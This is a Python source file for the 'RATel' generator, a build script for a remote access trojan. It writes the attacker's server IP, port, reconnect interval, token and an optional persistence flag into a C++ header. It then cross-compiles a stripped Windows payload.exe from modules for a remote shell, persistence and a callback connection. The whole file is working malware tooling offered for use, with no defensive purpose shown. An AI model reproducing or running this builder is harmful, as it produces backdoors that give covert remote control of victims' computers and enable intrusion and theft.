from subprocess import Popen
from subprocess import PIPE
import sys
import os
import binascii
import platform 
import time

import server.scripts.other as other
import argparse

from colorama import Fore,Style,init


class GeneratePayload:

    error = False

    def __init__(self,ip,auto=False, port=4444, reco=20, name="payload.exe"):

        self.path =  os.getcwd()+"/"+"client/inc/common.h"
        self.list_const_str = ["IP_ADDRESS","NAME_PROG","PATH_ADMIN","PATH_NOT_ADMIN","NAME_KEY_REGISTER","SPLIT"]
        
        if(auto):
            self.auto = "true"
        else:
            self.auto = "false"
        
        self.reco = reco * 1000 #mileseconds

        self.port = port
        self.ip = ip 
        self.name = name
        self.token = self.generateToken()
        
        try:
            self.os  = platform.system()
        except Exception as e:
            other.printColor("error",e)
            GeneratePayload.error = True
            exit(0)

        self.main()
    
    def writeFile(self, data):
        try:
           
            file=open(self.path, "w")
            file.write(data)
            #file.seek(0,0)
            file.close()

        except Exception as e:
            other.printColor("error", "[-] an error is triggered when writing to common.h")
            other.printColor("error", str(e))
            GeneratePayload.error = True
            exit(0)
        else:
            other.printColor("successfully", "[+] writing in common.h is done successfully. ")


    def generateToken(self):
        token = binascii.hexlify(os.urandom(22)).decode()
        other.printColor("successfully", "[+] the tokken was generated")
        other.printColor("successfully","[+] token: {}\n".format(token))
        return token

    def compilate(self):

        current_path = os.getcwd()

        if(self.os == "Linux"):
            #if os is linux <3
            cmd = "i686-w64-mingw32-g++ main.cpp  other.cpp  ModShell.cpp  HandShake.cpp  Connexion.cpp  Persistence.cpp  -o {}  -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path+"/payload/"+self.name)
        elif(self.os == "Windows"):
            cmd = "g++ main.cpp HandShake.cpp ModShell.cpp Persistence.cpp Connexion.cpp other.cpp -o {} -lws2_32 -Os -s".format(self.name)
        else:
            other.printColor("error","[-] RATel is incompatible with: {}".format(self.os))
            other.printColor("error","[-] please try to restart the RATelgenerator on Windows or Linux.")
            GeneratePayload.error = True
            exit(0)
        
        os.chdir("client/src") #move 

        with Popen(cmd, stdout=PIPE,stderr=PIPE,shell=True) as cmd:
            other.printColor("information","[+] compilation in progress...")
            out,err = str(cmd.stdout.read(),"UTF8",errors="ignore"),str(cmd.stderr.read(),"UTF8",errors="ignore")
            if not err:
                print(out)

                
            else:
                other.printColor("error","[-] An error is triggered when compiling the RAT.")
                other.printColor("error",err) 
                GeneratePayload.error = True
                exit(0)

        other.printColor("successfully","[+] the RAT was successfully compiled.") 
        other.printColor("information", "[?] the location of the RAT: {}\n".format(current_path+"/payload/"+self.name))   
        
    def main(self):
        #Choice default.
        #If the user does not add any argument in the command line.

        other.printColor("information","[+] the current OS of the system: {}\n".format(self.os))

        #print(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.token))
        self.writeFile(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.token))
        self.compilate() #compilate
        time.sleep(2) #tempo 
        self.writeFile(str(other.commonHeader())) #rewrite default header

        pass


parser = argparse.ArgumentParser()
parser.add_argument("-a","--auto", action="store_true", default=False, help="if the parameter is added, the rat will automatically perform the persistence.")
parser.add_argument("-p","--port", dest="PORT", default=4444, help="the port number of the server.")
parser.add_argument("-i","--ip", dest="IP", required=True, help="IP address of the server.")
parser.add_argument("-r","--reconnect", dest="RECONNECT",default=20,  help="the time between each reconnection attempt if the server is offline (in seconds).")
parser.add_argument("-n","--name",dest="NAME", default="payload.exe", help="the name of the executable (of the rat)")
parser.add_argument("-d","--move",dest="MOVE" ,default=False)

init()

try:

    argv = vars(parser.parse_args())
    print(argv)

    AUTO = bool(argv["auto"])
    PORT = int(argv["PORT"])
    IP  = str(argv["IP"])
    RECO = int(argv["RECONNECT"])
    name = str(argv["NAME"])

    if not(argv["MOVE"]):
        PATH = False
    else:
        PATH = argv["MOVE"]

    GeneratePayload(IP, AUTO, PORT, RECO, name)

except SystemExit:
    
    if(GeneratePayload.error):
        pass
    else:
        print("example: /usr/bin/python3 RATGenerator.py --ip 192.0.0.1" )
    

except KeyboardInterrupt:
    other.printColor("information","[-] Generator stop.")


#i686-w64-mingw32-g++ main.cpp  other.cpp  ModShell.cpp  HandShake.cpp  Connexion.cpp  Persistence.cpp  -o 12.exe -lws2_32
#i686-w64-mingw32-g++ main.cpp  other.cpp  ModShell.cpp  HandShake.cpp  Connexion.cpp  Persistence.cpp  -o 12.exe -lws2_32 -static-libgcc -static-libstdc++ -Os -s
#https://stackoverflow.com/questions/7973274/how-to-reduce-the-size-of-executable-produced-by-mingw-g-compiler
#https://arrayfire.com/cross-compile-to-windows-from-linux/